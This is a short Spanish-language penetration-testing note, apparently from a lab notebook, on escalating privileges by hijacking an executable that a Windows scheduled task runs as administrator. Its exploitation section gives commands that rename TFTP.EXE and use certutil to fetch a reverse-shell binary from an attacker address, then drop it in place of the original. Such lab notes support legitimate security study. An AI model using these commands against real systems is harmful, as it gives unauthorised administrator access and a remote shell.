## DESCRIPTION

En algunos equipos puede haber una tarea programada que ejecute un .EXE como administrador cada X periodo de tiempo.

En determinados casos la herramienta WINPEAS puede encontrarlo.

#### Mas información


## EXPLOITATION

### OPTION 1: .EXE HIJACKING

1. Encontramos el ejecutable o bien con winpeas o bien enumerando ficheros que nos den alguna pista como el siguietne ejemplo:
![[Pasted image 20230320172343.png]]

![[Pasted image 20230320172355.png]]

Es decir que se ejecuta una tarea programada que ejecutata “posiblemente como administrador” el ejecutable TFTP.EXE 

2. Creamos una reverse shell con el mismo nombre y lo subimos a ese directorio.

```
# 1º Movemos el fichero original

move TFTP.EXE TFTPold.EXE

# 2º Subimos la shell reversa

certutil.exe -urlcache -f http://192.168.45.5/TFTP.exe shell.exe

move shell.exe TFTP.EXE

```

3. Nos ponemos a la esucha y pasada el tiempo recibimos respuesta.

## MACHINES

* Hack The Box: 
* PG Practice: Slort
